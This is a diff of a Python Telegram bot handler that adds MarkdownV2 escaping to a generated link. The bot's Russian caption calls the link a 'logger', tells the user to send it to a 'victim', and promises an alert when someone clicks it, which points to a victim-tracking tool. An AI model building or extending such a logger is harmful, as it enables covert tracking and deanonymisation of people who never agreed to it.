@@ -4215,12 +4215,12 @@ async def handle_callback(call: types.CallbackQuery, bot_instance, dp_instance, 
 						timeout=aiohttp.ClientTimeout(total=5)) as _r:
 						data = await _r.json()
 				link = data["url"]
-				link_escaped = link.replace('.', '\\.').replace('-', '\\-')
+				link_escaped = link.replace('\\', '\\\\').replace('_', '\\_').replace('*', '\\*').replace('[', '\\[').replace(']', '\\]').replace('(', '\\(').replace(')', '\\)').replace('~', '\\~').replace('`', '\\`').replace('>', '\\>').replace('#', '\\#').replace('+', '\\+').replace('-', '\\-').replace('=', '\\=').replace('|', '\\|').replace('{', '\\{').replace('}', '\\}').replace('.', '\\.').replace('!', '\\!')
 				await bot_instance.edit_message_caption(
 					call.message.chat.id, call.message.message_id,
 					caption=(
 						f"🔗 *Логгер*\n\n"
-						f"*Ваша ссылка:*\n{link}\n\n"
+						f"*Ваша ссылка:*\n{link_escaped}\n\n"
 						f"*└─ Отправьте её жертве*\n"
 						f"*└─ Как только кто\\-то перейдёт — вам придёт уведомление*"
 					),
